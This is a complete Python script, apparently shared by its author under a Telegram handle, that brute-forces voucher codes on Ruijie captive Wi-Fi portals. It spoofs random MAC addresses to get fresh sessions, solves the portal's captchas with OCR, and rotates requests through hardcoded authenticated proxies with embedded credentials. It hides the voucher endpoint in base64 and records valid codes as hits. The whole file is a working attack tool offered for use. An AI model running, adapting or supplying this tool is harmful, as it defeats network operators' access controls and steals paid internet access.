#!/usr/bin/env python3
# spider_turbo.py - Ruijie Voucher Scanner (Spider Man Turbo Edition)
# Version: 7.1 - Spider ASCII Art Logo
# Telegram: @Spider_man1245
# Build for the dark.

import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import time
import socket
import sys
import gc
import cv2
import ddddocr
import numpy as np
import requests
import urllib3
from collections import deque
from concurrent.futures import ThreadPoolExecutor

# ═══════════════════════════════════════════════ CONFIG ═══════════════════════════════════════════════
CONCURRENCY = 500
BATCH_SIZE = 500
RESULT_FILE = os.path.expanduser("~/spider_hits.txt")
PROXY_FILE = "proxies.txt"
CAPTCHA_CACHE_SIZE = 100
SESSION_TTL = 45

DEFAULT_PROXIES = [
    "YCrTe8bwb89c5Zv8:X8u3JstXpHxkPgH@74.122.56.251:43674",
    "lVzbDOOAsjX2UZF:zwHuKptallSm05fP@48.45.238.154:44578",
    "LiA1aVgRQWCfDQK:zGIRzV1Jwqk8C7V@176.46.132.91:41794",
    "j0PK0bdf9c9jjNH:TOjHB E hb0C4nD2A@45.45.197.56:45714",
    "yYFHx25qcX0DUIp:NiVRk726WAjRLEO@74.122.57.184:45174"
]

# ═══════ GLOBALS ═══════
ocr = ddddocr.DdddOcr(show_ad=False)
captcha_cache = {}
proxy_list = []
use_proxy = False
stop_flag = False
hits = expired = limits = checked = 0
found_codes = []
current_code = "000000"
scan_start = 0
_connector = None
_sem = None
executor = ThreadPoolExecutor(max_workers=4)
portal_url = None

# ═══════ ANSI COLORS ═══════
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════ SPIDER ASCII ART LOGO ═══════════════════════════════════════════════
def show_logo():
    logo = f"""
{BOLD}{MAGENTA}         ▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐{RESET}
{BOLD}{MAGENTA}              🕷️ SPIDER MAN TURBO v7.1  🕷️{RESET}
{BOLD}{CYAN}              Telegram: @Spider_man1245{RESET}
{BOLD}{RED}             Build for the dark.{RESET}
{BOLD}{MAGENTA}         ▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐{RESET}

{BOLD}{WHITE}                    .     .  .       .      .      .     .  .{RESET}
{BOLD}{WHITE}                  .  .  .  .  .    .  .  .  .    .  .  .  .{RESET}
{BOLD}{RED}                    .  .  .  .  .    .  .  .  .    .  .  .  .{RESET}
{BOLD}{RED}                  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .{RESET}
{BOLD}{MAGENTA}                .  .  .  .  .  .  .  .  .  .  .  .  .  .{RESET}
{BOLD}{MAGENTA}              .  .  .  .  .  .  .  .  .  .  .  .  .  .  .{RESET}
{BOLD}{RED}                  .  .  .  .  .  .  .  .  .  .  .  .  .  .{RESET}
{BOLD}{RED}                .  .  .  .  .  .  .  .  .  .  .  .  .  .  .{RESET}
{BOLD}{WHITE}                  .  .  .  .  .  .  .  .  .  .  .  .  .{RESET}
{BOLD}{WHITE}                .  .  .  .  .  .  .  .  .  .  .  .  .  .{RESET}
{BOLD}{MAGENTA}   ኈኈኈኈኈኈኈኗኈኈኈኈኈኈኗ ኈኈኗኈኈኈኈኈኈኈኗ ኈኈኈኈኈኈኈኗኈኈኈኈኈኈኗ    ኈኈኈኗ  ኈኈኈኗ{RESET}
{BOLD}{MAGENTA}    ኈኈኔነነነነኝኈኈኔነነኈኈኗኈኈኑኈኈኔነነኈኈኗኈኈኔነነነነኝኈኈኔነነኈኈኗ   ኈኈኈኈኗ ኈኈኈኈኗ{RESET}
{BOLD}{MAGENTA}    ኈኈኈኈኈኈኈኗኈኈኈኈኈኈኔኝኈኈኑኈኈኗ  ኈኈኑኈኈኈኈኈኈኗ ኈኈኈኈኈኈኔኝ   ኈኈኔኈኈኈኈኔኈኈኑ{RESET}
{BOLD}{MAGENTA}    ኚነነነነኈኈኑኈኈኔነነነኝ ኈኈኑኈኈኗ  ኈኈኑኈኈኔነነኝ ኈኈኔነነኈኈኗ   ኈኈኑኚኈኈኔኝኈኈኑ{RESET}
{BOLD}{MAGENTA}    ኈኈኈኈኈኈኈኑኈኈኑ     ኈኈኑኈኈኈኈኈኈኈኔኝኈኈኈኈኈኈኈኗኈኈኑ  ኈኈኑ   ኈኈኑ ኚነኝ ኈኈኑ{RESET}
{BOLD}{MAGENTA}    ኚነነነነነነኝኚነኝ     ኚነኝኚነነነነነነኝ ኚነነነነነነነኝኚነኝ   ኚነኝ    ኚነኝ{RESET}
{BOLD}{RED}              ኈኈኈኈኈኈኗ ኈኈኈኈኈኗ ኈኈኈኈኈኈኈኗ ኈኈኗ ኈኈኗ{RESET}
{BOLD}{RED}              ኈኈኔነነኈኈኗኈኈኔነነኈኈኗኈኈኔነነኈኈኗኈኈኑ ኈኈኔኝ{RESET}
{BOLD}{RED}              ኈኈኈኈኈኈኔኝኈኈኈኈኈኈኈኑኈኈኈኈኈኈኔኝኈኈኈኈኈኔኝ {RESET}
{BOLD}{RED}              ኈኈኔነነኈኈኗኈኈኔነነኈኈኑኈኈኔነነኈኈኗኈኈኔነኈኈኗ {RESET}
{BOLD}{RED}              ኈኈኑ  ኈኈኑኈኈኑ  ኈኈኑኈኈኑ  ኈኈኑኈኈኗ{RESET}
{BOLD}{RED}              ኚነኝ  ኚነኝኚነኝ  ኚነኝኚነኝ  ኚነኝ{RESET}
{BOLD}{WHITE}         ▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐▐{RESET}
"""
    print(logo)

# ═══════════════════════════════════════════════ PROXY LOADER ═══════════════════════════════════════════════
def load_proxies():
    global proxy_list
    proxy_list = []
    if os.path.exists(PROXY_FILE):
        try:
            with open(PROXY_FILE, 'r') as f:
                proxy_list = [line.strip() for line in f if line.strip()]
            if proxy_list:
                print(f"{GREEN}✅ Loaded {len(proxy_list)} proxies from {PROXY_FILE}{RESET}")
                return True
        except:
            pass
    print(f"{YELLOW}⚠️ proxies.txt not found. Using built-in defaults.{RESET}")
    proxy_list = DEFAULT_PROXIES.copy()
    if proxy_list:
        print(f"{GREEN}✅ Loaded {len(proxy_list)} default proxies.{RESET}")
        return True
    return False

def next_proxy():
    if not proxy_list:
        return None
    p = proxy_list.pop(0)
    proxy_list.append(p)
    return f"http://{p}"

# ═══════════════════════════════════════════════ PORTAL CATCHER ═══════════════════════════════════════════════
def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except:
        return "192.168.110.1"

def fetch_portal():
    print(f"\n{BLUE}[*] Spider Man hunting portal...{RESET}")
    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254"]
    gateways = list(dict.fromkeys(gateways))
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        'Accept': '*/*'
    }
    for gw in gateways:
        target = f"http://{gw}"
        print(f"{CYAN}[*] Trying: {target}...{RESET}")
        try:
            res = requests.get(target, headers=headers, timeout=3, allow_redirects=True)
            if "portal-as.ruijienetworks.com" in res.url:
                portal_url = res.url
                break
            match = re.search(r"href=['\"](.*?)['\"]", res.text)
            if match and "portal-as.ruijienetworks.com" in match.group(1):
                extracted = match.group(1)
                portal_url = extracted if extracted.startswith("http") else "https://portal-as.ruijienetworks.com" + extracted
                break
        except requests.exceptions.RequestException:
            pass
    if portal_url:
        api_url = portal_url.replace("/auth/wifidogAuth/login/?", "/api/auth/wifidog?stage=portal&")
        api_url = api_url.replace("/auth/wifidogAuth/login?", "/api/auth/wifidog?stage=portal&")
        print(f"\n{GREEN}[+] Portal captured!{RESET}")
        return api_url
    else:
        print(f"\n{RED}[-] Failed to capture portal{RESET}")
        return None

# ═══════════════════════════════════════════════ CODE GENERATORS ═══════════════════════════════════════════════
def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        pool = list(range(10 ** length))
        random.shuffle(pool)
        for num in pool:
            yield str(num).zfill(length)
    elif mode == "mixed6":
        chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        while True:
            yield ''.join(random.choices(chars, k=6))
    elif mode == "lower6":
        chars = "abcdefghijklmnopqrstuvwxyz"
        while True:
            yield ''.join(random.choices(chars, k=6))
    else:
        while True:
            yield ''.join(random.choices("0123456789", k=6))

# ═══════════════════════════════════════════════ CAPTCHA WITH CACHE ═══════════════════════════════════════════════
async def get_captcha_text(sess, session_id):
    now = time.time()
    if session_id in captcha_cache:
        entry = captcha_cache[session_id]
        if now - entry['ts'] < SESSION_TTL:
            return entry['text']
    
    for attempt in range(2):
        try:
            async with sess.get(
                "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
                params={'sessionId': session_id, '_t': str(now)},
                ssl=False
            ) as r:
                img = await r.read()
            
            loop = asyncio.get_running_loop()
            text = await loop.run_in_executor(executor, lambda: ocr.classification(img).upper())
            
            if text and len(text) >= 4:
                async with sess.post(
                    "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
                    json={'sessionId': session_id, 'authCode': text},
                    ssl=False
                ) as r2:
                    data = await r2.json()
                    if data.get("success"):
                        captcha_cache[session_id] = {'text': text, 'ts': now}
                        if len(captcha_cache) > CAPTCHA_CACHE_SIZE:
                            oldest = min(captcha_cache.keys(), key=lambda k: captcha_cache[k]['ts'])
                            del captcha_cache[oldest]
                        return text
        except:
            pass
    return None

# ═══════════════════════════════════════════════ SESSION ID ═══════════════════════════════════════════════
async def get_session_id(sess, portal_url):
    mac = ":".join(f"{x:02x}" for x in ([0x02] + [random.randint(0,255) for _ in range(5)]))
    url = re.sub(r'(?<=mac=)[^&]+', mac, portal_url)
    try:
        async with sess.get(url, allow_redirects=True, ssl=False) as r:
            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return match.group(1) if match else None
    except:
        return None

# ═══════════════════════════════════════════════ VOUCHER CHECK ═══════════════════════════════════════════════
POST_URL = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXI/dm91Y2hlclR5cGU9Vk9VQ0hFUg=='
).decode()

async def check_voucher(portal_url, code):
    global hits, expired, limits, checked, current_code, found_codes
    current_code = code
    checked += 1

    proxy = next_proxy() if use_proxy and proxy_list else None

    async with aiohttp.ClientSession(
        connector=_connector,
        connector_owner=False,
        cookie_jar=aiohttp.CookieJar(),
        timeout=aiohttp.ClientTimeout(total=10)
    ) as sess:
        session_id = await get_session_id(sess, portal_url)
        if not session_id:
            expired += 1
            return

        captcha = await get_captcha_text(sess, session_id)
        if not captcha:
            expired += 1
            return

        payload = {
            "accessCode": code,
            "sessionId": session_id,
            "apiVersion": 1,
            "authCode": captcha,
        }
        headers = {
            "authority": "portal-as.ruijienetworks.com",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; K) Chrome/139.0.0.0 Mobile",
        }

        try:
            async with sess.post(POST_URL, json=payload, headers=headers, proxy=proxy, ssl=False) as r:
                resp = await r.text()
        except:
            expired += 1
            return

        if 'logonUrl' in resp:
            hits += 1
            info = "Plan:UNKNOWN | Time:Active"
            found_codes.append(f"{code} | {info}")
            with open(RESULT_FILE, "a", encoding="utf-8") as f:
                f.write(f"[SPIDER-HIT] {code} | {info}\n")
        elif 'STA' in resp or 'limited' in resp.lower():
            limits += 1
        else:
            expired += 1

# ═══════════════════════════════════════════════ MAIN BRUTEFORCE ═══════════════════════════════════════════════
async def run_bruteforce(mode, portal_url, speed):
    global _connector, _sem, stop_flag, scan_start, checked, hits, expired, limits, found_codes
    global current_code

    _connector = aiohttp.TCPConnector(limit=speed + 200, ssl=False, force_close=True)
    _sem = asyncio.Semaphore(speed)
    stop_flag = False
    checked = hits = expired = limits = 0
    found_codes = []
    current_code = "000000"
    scan_start = time.time()

    code_iter = iter_codes(mode)
    print(f"\n{BOLD}{GREEN}🕷️ Spider Man Turbo ON | Workers: {speed}{RESET}")

    try:
        while not stop_flag:
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            tasks = []
            for code in batch:
                async def _wrapper(c=code):
                    async with _sem:
                        await check_voucher(portal_url, c)
                tasks.append(_wrapper())

            await asyncio.gather(*tasks, return_exceptions=True)

            elapsed = time.time() - scan_start
            rate = (checked / elapsed) if elapsed > 0 else 0

            # Live display with Spider Art
            print("\033c", end="")
            show_logo()
            print(f"{BOLD}{BLUE}▐▐▐▐▐▐▐▐▐▐ LIVE STATUS ▐▐▐▐▐▐▐▐▐▐{RESET}")
            print(f"{GREEN}✅ Checked : {checked:,}{RESET}")
            print(f"{CYAN}🚀 Speed   : {rate:.0f} codes/sec{RESET}")
            print(f"{GREEN}✅ Hits    : {hits}{RESET}")
            print(f"{YELLOW}⚠️ Limits  : {limits}{RESET}")
            print(f"{RED}❌ Expired : {expired}{RESET}")
            print(f"{MAGENTA}➔ Current : {current_code}{RESET}")
            print(f"{BLUE}════════════════════════════════════════════════{RESET}")
            if found_codes:
                print(f"{BOLD}{GREEN}✅ RECENT HITS:{RESET}")
                for c in found_codes[-5:]:
                    print(f"  {GREEN}✅ {c}{RESET}")

    except (asyncio.CancelledError, KeyboardInterrupt):
        stop_flag = True
    finally:
        if _connector:
            await _connector.close()

    elapsed = time.time() - scan_start
    hh, rem = divmod(int(elapsed), 3600)
    mm, ss = divmod(rem, 60)

    print(f"\n\n{BOLD}{GREEN}{'='*55}{RESET}")
    print(f"  {BOLD}{GREEN}🕷️ Scan Complete{RESET}")
    print(f"{BOLD}{GREEN}{'='*55}{RESET}")
    print(f"  {BLUE}Time    : {hh}h {mm}m {ss}s{RESET}")
    print(f"  {BLUE}Checked : {checked:,}{RESET}")
    print(f"  {GREEN}Hits    : {hits}{RESET}")
    print(f"  {YELLOW}Limits  : {limits}{RESET}")
    print(f"  {RED}Expired : {expired}{RESET}")
    print(f"  {BLUE}Results : {RESULT_FILE}{RESET}")
    print(f"{BOLD}{GREEN}{'='*55}{RESET}")

    if found_codes:
        print(f"\n{GREEN}✅ ALL HITS:{RESET}")
        for c in found_codes:
            print(f"   {c}")

    input(f"\n{CYAN}[*] Press Enter to continue...{RESET}")

# ═══════════════════════════════════════════════ VIEW RESULTS ═══════════════════════════════════════════════
def view_results():
    if os.path.exists(RESULT_FILE):
        print(f"\n{BOLD}{CYAN}📁 Results from {RESULT_FILE}:\n{RESET}")
        with open(RESULT_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
            if content.strip():
                print(content)
            else:
                print(f"{YELLOW}[!] File is empty.{RESET}")
    else:
        print(f"\n{YELLOW}[!] No results file found.{RESET}")

# ═══════════════════════════════════════════════ MENU ═══════════════════════════════════════════════
def show_menu():
    print(f"\n{BOLD}{BLUE}▌═════════════════════════════════════════════════▐{RESET}")
    print(f"{BOLD}{BLUE}▌  🕷️ SPIDER MAN TURBO v7.1    ▐{RESET}")
    print(f"{BOLD}{BLUE}▌  @Spider_man1245             ▐{RESET}")
    print(f"{BOLD}{BLUE}▌  Build for the dark          ▐{RESET}")
    print(f"{BOLD}{BLUE}▐══════════════════════════════════════════════════▐{RESET}")
    print(f"  {YELLOW}1.{RESET} Auto-Catch Portal URL")
    print(f"  {YELLOW}2.{RESET} Manual Enter Portal URL")
    print(f"  {YELLOW}3.{RESET} Start Scan (6-digit)")
    print(f"  {YELLOW}4.{RESET} Start Scan (7-digit)")
    print(f"  {YELLOW}5.{RESET} Start Scan (8-digit)")
    print(f"  {YELLOW}6.{RESET} View Hits")
    print(f"  {YELLOW}7.{RESET} Exit")

# ═══════════════════════════════════════════════ MAIN LOOP ═══════════════════════════════════════════════
async def async_main():
    global portal_url, use_proxy, CONCURRENCY

    os.system('clear' if os.name == 'posix' else 'cls')
    show_logo()

    if load_proxies():
        use_proxy = True
        print(f"{GREEN}🌐 Auto-Proxy Enabled ({len(proxy_list)} proxies){RESET}")
    else:
        use_proxy = False
        print(f"{YELLOW}⚠️ No proxies available.{RESET}")

    portal_url = None

    while True:
        show_menu()
        choice = input(f"\n{BOLD}{GREEN}🕷️ Enter choice:{RESET} ").strip()

        if choice == "1":
            portal_url = fetch_portal()
            if portal_url:
                print(f"{GREEN}[✅] URL: {portal_url}{RESET}")
            input(f"\n{CYAN}[*] Press Enter...{RESET}")

        elif choice == "2":
            print(f"\n{YELLOW}[*] Enter Portal URL:{RESET}")
            portal_url = input("➔ ").strip()
            if portal_url:
                print(f"{GREEN}[✅] URL set!{RESET}")
            input(f"\n{CYAN}[*] Press Enter...{RESET}")

        elif choice in ["3", "4", "5"]:
            if not portal_url:
                print(f"{RED}[❌] Please set Portal URL first (Option 1 or 2).{RESET}")
                input(f"\n{CYAN}[*] Press Enter...{RESET}")
                continue

            mode_map = {"3": "6", "4": "7", "5": "8"}
            mode = mode_map[choice]

            print(f"\n{YELLOW}[*] Enter worker count (default {CONCURRENCY}):{RESET}")
            inp = input("➔ ").strip()
            if inp.isdigit():
                CONCURRENCY = int(inp)
                BATCH_SIZE = CONCURRENCY

            await run_bruteforce(mode, portal_url, CONCURRENCY)

        elif choice == "6":
            view_results()
            input(f"\n{CYAN}[*] Press Enter...{RESET}")

        elif choice == "7":
            print(f"\n{YELLOW}🕷️ Exiting...{RESET}")
            break

        else:
            print(f"{RED}[❌] Invalid choice!{RESET}")
            time.sleep(1)

# ═══════════════════════════════════════════════ ENTRY POINT ═══════════════════════════════════════════════
if __name__ == "__main__":
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}🕷️ Interrupted by user.{RESET}")
    except Exception as e:
        print(f"\n{RED}[❌] Fatal Error: {e}{RESET}")
